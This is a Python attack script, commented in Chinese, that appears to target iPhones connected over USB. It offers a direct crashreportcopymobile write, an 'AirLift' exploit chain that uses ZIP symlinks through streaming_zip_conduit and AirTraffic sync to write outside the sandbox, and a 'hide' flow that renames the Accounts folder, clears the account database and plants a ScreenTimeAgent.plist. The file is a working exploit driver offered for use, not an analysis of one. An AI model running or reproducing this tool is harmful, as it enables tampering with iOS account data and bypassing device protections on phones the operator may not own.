"""
Accounts3.sqlite 覆盖攻击 — Windows 版本
使用官方 libimobiledevice DLL（与 3uTools / iTunes / MIX Ramdisk 同栈）。

攻击模式（严格对应原版规格）：
  1. Direct 直写：crashreportcopymobile AFC 直接写（快，但 iOS 27 已收紧）
  2. AirLift 漏洞链：ZIP+符号链接 → streaming_zip_conduit → AirTraffic 图书同步
     顺链接写穿透到容器外（iOS 27 唯一可能的路径）

auto 模式：先 Direct，成功且读回一致则结束；否则 fallback 到 AirLift。
"""

from __future__ import annotations

import argparse
import hashlib
import json
import posixpath
import secrets
import sys
from typing import Any

import apple_native_wrapper as lw

# ─────────── 常量 ───────────

ACCOUNTS_TARGET_DIR = "/var/mobile/Library/Accounts"
ACCOUNTS_LEAF = "Accounts3.sqlite"
ACCOUNTS_FULL_PATH = posixpath.join(ACCOUNTS_TARGET_DIR, ACCOUNTS_LEAF)

CANARY_TEMPLATE = "airlift canary\nnonce={nonce}\n"


# ─────────── payload 生成 ───────────

def generate_accounts_payload() -> tuple[bytes, str]:
    """生成 canary payload（与原版一致的格式）。"""
    nonce_hex = secrets.token_hex(24)
    canary_text = CANARY_TEMPLATE.format(nonce=nonce_hex)
    payload = canary_text.encode("utf-8")
    return payload, nonce_hex


# ==============================================================================
# 模式一：Direct 直写（crashreportcopymobile）
# ==============================================================================

def attack_direct(
    udid: str,
    target_file: str,
    payload: bytes,
) -> dict[str, Any]:
    """
    通过 com.apple.crashreportcopymobile 的 AFC 直接写文件。
    高版本 iOS 收紧后写不到 Accounts 目录，调用会失败或读回不一致。
    返回结构化结果，供 auto 模式判断是否要 fallback。
    """
    result: dict[str, Any] = {"ok": False, "readbackMatch": False,
                              "method": "crashreportcopymobile-direct"}
    try:
        device = lw.iDevice(udid)
        try:
            ld = lw.LockdownClient(device, handshake=True)
            try:
                svc = ld.start_service("com.apple.crashreportcopymobile")
                afc = lw.AFCClient(device, svc)
                try:
                    # 逐级确保目标目录存在（失败可忽略，可能已存在或无权限）
                    cur = ""
                    for part in posixpath.dirname(target_file).split("/"):
                        if not part:
                            continue
                        cur = posixpath.join(cur, part)
                        try:
                            afc.make_directory(cur)
                        except Exception:
                            pass

                    # 写入
                    afc.write_file(target_file, payload)

                    # 读回核对：防止"返回成功但实际被沙箱重定向"
                    data = afc.read_file(target_file)
                    if data is not None:
                        result["readbackMatch"] = (data == payload)
                        result["ok"] = result["readbackMatch"]
                finally:
                    afc.free()
            finally:
                ld.free()
        finally:
            device.free()
    except Exception as e:
        result["error"] = str(e)
    return result


# ==============================================================================
# 模式二：AirLift 漏洞链
# ==============================================================================

def attack_airlift(
    udid: str,
    target_dir: str,
    leaf_name: str | None,
    payload: bytes | None,
    progress_cb=None,
    accounts_backup_path: str | None = None,
    snap_dir: str | None = None,
) -> dict[str, Any]:
    """AirLift 漏洞 — streaming_zip_conduit + AirTraffic 顺链接写穿透。

    leaf_name=None 且 payload=None 时为 canary 安全验证模式：
    目标目录下由内部自动生成全新 canary 文件，不覆盖任何现有文件。
    """
    from airlift_attack import run_airlift_attack

    result = run_airlift_attack(
        udid=udid,
        target=target_dir,
        payload=payload,
        leaf_name=leaf_name,
        snap_dir=snap_dir,
        accounts_backup_path=accounts_backup_path,
        progress=progress_cb,
    )

    # 包装成统一格式
    # canary 模式下 leaf_name=None，真实 leaf 由 run_airlift_attack 内部生成
    effective_leaf = leaf_name if leaf_name else result.get("generatedLeaf")
    attack_result = {
        "ok": result.get("ok", False),
        "method": "airlift-streaming_zip_conduit-airtraffic",
        "targetPath": posixpath.join(target_dir, effective_leaf)
                      if effective_leaf else target_dir,
        "payloadLength": result.get("payloadLength", 0),
        "stageSucceeded": result.get("stageSucceeded", False),
        "airTrafficSucceeded": result.get("airTrafficSucceeded", False),
        "exactBytesRecovered": result.get("exactBytesRecovered", False),
        "cleanupComplete": result.get("cleanupComplete", False),
        "existingFileTargeted": result.get("existingFileTargeted", False),
    }
    if not result.get("ok") and "diagnostics" in result:
        diag = result["diagnostics"]
        # 找出第一个失败环节的错误信息
        for phase in ("airTraffic", "stage", "finish"):
            if phase in diag and isinstance(diag[phase], dict):
                if diag[phase].get("error"):
                    attack_result["error"] = f"{phase}: {diag[phase]['error']}"
                    break
    return attack_result


# ==============================================================================
# 模式三：第三方式设备侧 rename（Accounts -> Accounts123）
# ==============================================================================

def attack_rename(
    udid: str,
    progress_cb=None,
    workdir: str | None = None,
) -> dict[str, Any]:
    """Third-party-style on-device rename: Accounts -> Accounts123.

    Drives the in-process Apple native transport (stage / finish-rename) and
    the AirTrafficHost.dll Grappa exchange. Success is determined by the
    finish-rename probe (renameConfirmed), not by the AirTraffic exchange.
    """
    import logging
    from rename_orchestrator import run_rename

    logger = logging.getLogger("rename")
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stderr)
        handler.setFormatter(logging.Formatter("[rename] %(message)s"))
        logger.addHandler(handler)
    logger.setLevel(logging.INFO)

    result = run_rename(udid, progress=progress_cb, logger=logger,
                        workdir=workdir)
    data = result.to_dict()
    out = {
        "ok": data.get("ok", False),
        "method": "device-rename-accounts-to-accounts123",
        "renameConfirmed": data.get("renameConfirmed", False),
        "stageSucceeded": data.get("stageSucceeded", False),
        "airTrafficSucceeded": data.get("airTrafficSucceeded", False),
        "cleanupComplete": data.get("cleanupComplete", False),
        "targetPath": "/var/mobile/Library/Accounts123",
        "token": data.get("token", ""),
    }
    if not out["ok"]:
        diag = data.get("diagnostics", {})
        for phase in ("stage", "airTraffic", "finish", "snapshot"):
            node = diag.get(phase)
            if isinstance(node, dict) and node.get("error"):
                detail = node.get("detail", "")
                out["error"] = f"{phase}: {node['error']}" + (f" — {detail}" if detail else "")
                break
        else:
            if not out["renameConfirmed"]:
                out["error"] = "rename not confirmed on device"
    return out


# ==============================================================================
# 总入口（对应 reference run_attack）
# ==============================================================================

def attack_accounts(
    requested_device: str | None,
    *,
    verbose: bool,
    dry_run: bool = False,
    quiet: bool = False,
    mode: str = "auto",  # "auto","direct","airlift","airlift-canary","rename"
) -> dict[str, Any]:
    """
    执行 Accounts3.sqlite 覆盖攻击。

    mode:
      auto           - 先 Direct，成功且读回一致则结束；否则 fallback 到 AirLift
      direct         - crashreportcopymobile 直写
      airlift        - AirLift 漏洞链（真实覆盖 Accounts3.sqlite）
      airlift-canary - AirLift 安全验证：跳过 Direct，目标 SpringBoard，
                       只投递全新 canary 文件，不碰任何系统文件
    """
    if not lw.is_available():
        raise RuntimeError(
            f"libimobiledevice DLL not available: {lw.load_error()}"
        )

    payload, nonce = generate_accounts_payload()

    if not quiet:
        print(f"[*] Backend: libimobiledevice DLL", file=sys.stderr)
        print(f"[*] Payload: {len(payload)} bytes, nonce={nonce[:16]}...",
              file=sys.stderr)
        print(f"[*] Target: {ACCOUNTS_FULL_PATH}", file=sys.stderr)
        print(f"[*] Mode: {mode}", file=sys.stderr)

    if dry_run:
        return {
            "ok": True,
            "mode": "dry-run",
            "payloadLength": len(payload),
            "payloadSHA256": hashlib.sha256(payload).hexdigest(),
            "nonce": nonce,
            "targetPath": ACCOUNTS_FULL_PATH,
        }

    # 找设备
    udid = requested_device
    if not udid:
        devices = lw.list_devices()
        if not devices:
            raise RuntimeError("no USB iOS device found")
        udid = devices[0]

    # ── iFineOpenHide：WriteOpenHideLikeLift（kept-link move-out + 清账户
    #    数据库 + 写入固定 ScreenTimeAgent.plist）──
    if mode == "rename":

        def _hide_progress(msg: str, pct: float):
            print(f"  [{pct*100:.0f}%] {msg}", file=sys.stderr)
            sys.stderr.flush()

        try:
            from rename_orchestrator import run_hide_flow
            result = run_hide_flow(udid, _hide_progress)
        except Exception as exc:
            print(f"[ERROR] run_hide_flow 导入/执行异常: {exc}", file=sys.stderr)
            sys.stderr.flush()
            result = {
                "ok": False,
                "mode": "rename",
                "error": str(exc),
                "renameConfirmed": False,
                "stageSucceeded": False,
                "airTrafficSucceeded": False,
                "writeSucceeded": False,
                "finishRenameVerified": False,
                "cleanupComplete": False,
            }
        result["mode"] = "rename"
        return result

    # 读设备信息
    info: dict[str, str] = {}
    try:
        device = lw.iDevice(udid)
        ld = lw.LockdownClient(device, handshake=True)
        try:
            all_vals = ld.get_value() or {}
            if isinstance(all_vals, dict):
                info = {
                    "name": str(all_vals.get("DeviceName", "")),
                    "model": str(all_vals.get("ProductType", "")),
                    "version": str(all_vals.get("ProductVersion", "")),
                    "build": str(all_vals.get("BuildVersion", "")),
                    "udid": str(all_vals.get("UniqueDeviceID", udid)),
                }
        finally:
            ld.free()
            device.free()
    except Exception:
        pass

    if not quiet and info:
        print(f"[*] Device: {info.get('name', '?')} "
              f"({info.get('model', '?')}) "
              f"iOS {info.get('version', '?')}",
              file=sys.stderr)

    # ── AirLift canary 安全验证模式（跳过 Direct，不碰系统文件）──
    if mode == "airlift-canary":
        CANARY_TARGET_DIR = "/var/mobile/Library/SpringBoard"
        if not quiet:
            print(f"\n[*] AirLift canary test (SpringBoard, "
                  f"no system files touched)...", file=sys.stderr)

        def _progress_c(msg: str, pct: float):
            print(f"  [AirLift {pct*100:.0f}%] {msg}", file=sys.stderr)

        import tempfile
        from pathlib import Path
        tmp_dir = Path(tempfile.mkdtemp(prefix="airlift_"))
        snap_dir = tmp_dir / "books_snapshot"

        canary_result = attack_airlift(
            udid, CANARY_TARGET_DIR, None, None,
            progress_cb=_progress_c,
            accounts_backup_path=None,
            snap_dir=str(snap_dir),
        )
        canary_result["mode"] = "airlift-canary"
        canary_result["device"] = info

        if canary_result.get("ok"):
            if not quiet:
                print(f"\n[SUCCESS] AirLift canary write-through confirmed.",
                      file=sys.stderr)
        else:
            if not quiet:
                print(f"\n[FAILED] Canary test failed.", file=sys.stderr)
        return canary_result

    # ── Direct 模式 ──
    if mode in ("direct", "auto"):
        if not quiet:
            print(f"\n[*] Attempt 1: Direct write via crashreportcopymobile...",
                  file=sys.stderr)

        direct_result = attack_direct(udid, ACCOUNTS_FULL_PATH, payload)

        if mode == "direct":
            direct_result["mode"] = "direct"
            direct_result["device"] = info
            direct_result["nonce"] = nonce
            direct_result["payloadSHA256"] = hashlib.sha256(
                payload).hexdigest()
            return direct_result

        if (direct_result.get("ok")
                and direct_result.get("readbackMatch")):
            if not quiet:
                print(f"[*] Direct write succeeded with readback match ✓", file=sys.stderr)
            direct_result["mode"] = "direct"
            direct_result["device"] = info
            direct_result["nonce"] = nonce
            direct_result["payloadSHA256"] = hashlib.sha256(
                payload).hexdigest()
            return direct_result

        if not quiet:
            print(f"[!] Direct write ineffective "
                  f"(ok={direct_result.get('ok')}, "
                  f"readbackMatch={direct_result.get('readbackMatch')}), "
                  f"falling back to AirLift...", file=sys.stderr)

    # ── AirLift 模式 ──
    if not quiet:
        print(f"\n[*] Attempt 2: AirLift exploit...", file=sys.stderr)

    def _progress(msg: str, pct: float):
        print(f"  [AirLift {pct*100:.0f}%] {msg}", file=sys.stderr)

    import tempfile
    from pathlib import Path

    # 生成临时备份目录
    tmp_dir = Path(tempfile.mkdtemp(prefix="airlift_"))
    accounts_backup = tmp_dir / "Accounts3.sqlite.backup"
    snap_dir = tmp_dir / "books_snapshot"

    airlift_result = attack_airlift(
        udid, ACCOUNTS_TARGET_DIR, ACCOUNTS_LEAF, payload,
        progress_cb=_progress if verbose else None,
        accounts_backup_path=str(accounts_backup),
        snap_dir=str(snap_dir),
    )

    airlift_result["mode"] = "airlift"
    airlift_result["device"] = info
    airlift_result["nonce"] = nonce
    airlift_result["payloadSHA256"] = hashlib.sha256(payload).hexdigest()

    if airlift_result.get("ok"):
        if not quiet:
            print(f"\n[SUCCESS] AirLift attack completed", file=sys.stderr)
    else:
        if not quiet:
            print(f"\n[FAILED] Attack failed", file=sys.stderr)
            if airlift_result.get("error"):
                print(f"  Error: {airlift_result['error']}", file=sys.stderr)

    return airlift_result


# ==============================================================================
# 命令行入口
# ==============================================================================

def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--device", metavar="UDID", help="Target device UDID")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--dry-run", action="store_true",
                        help="Generate payload only")
    parser.add_argument("--quiet", action="store_true", help="Minimal output")
    parser.add_argument(
        "--mode",
        choices=["auto", "direct", "airlift", "airlift-canary", "rename"],
        default="auto",
        help="Attack mode (rename = third-party-style Accounts rename)"
    )

    args = parser.parse_args()

    try:
        result = attack_accounts(
            args.device,
            verbose=args.verbose,
            dry_run=args.dry_run,
            quiet=args.quiet,
            mode=args.mode,
        )
    except Exception as error:
        result = {"ok": False, "error": str(error)}
        print(json.dumps(result, ensure_ascii=False, sort_keys=True))
        return 1

    if not args.quiet or args.verbose:
        print(json.dumps(result, indent=2, ensure_ascii=False,
                         sort_keys=True, default=str))

    return 0 if result.get("ok") else 2


if __name__ == "__main__":
    raise SystemExit(main())
